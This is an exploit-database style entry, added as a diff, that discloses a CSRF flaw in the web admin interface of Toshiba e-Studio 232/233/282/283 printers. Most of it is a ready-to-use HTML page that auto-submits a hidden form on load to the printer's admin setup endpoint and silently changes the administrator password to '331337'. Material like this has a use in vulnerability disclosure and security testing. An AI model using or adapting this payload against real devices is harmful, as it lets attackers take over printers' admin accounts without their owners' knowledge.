@@ -1,0 +1,27 @@
+# Exploit Title: TOSHIBA e-Studio 232/233/282/283 Change Admin Password CSRF Vulnerability
+# Date: 02.10.2013
+# Exploit Author: Hubert Gradek (PL)
+# Affected version: firmware T377SY0EXXX
+# Tested on: TOSHIBA e-Studio 232 (T377SY0E354) / 233 (T377SY0E331)
+# CVE : No CVE exists - 0day exploit
+
+
+
+Password must be minimum 6 digits!!!
+login: Admin
+
+
+EXPLOIT:
+
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<H2>TOSHIBA e-Studio 232/233/282/283 Change Admin Password</H2>
+<form name="form0" action="http://[IP_ADDR]:8080/ADMIN/SETUP/Save" method="post">
+<input type="hidden" name="MODE" value="General" />
+<input type="hidden" name="EDTCHK" value="1" />
+<input type="hidden" name="STRADMINPASS" value="331337" />
+<input type="hidden" name="STRADMINPASSDUMMY" value="331337" />
+<input type="hidden" name="STRCONADMINPASS" value="331337" />
+</form>
+</body>
+</html>
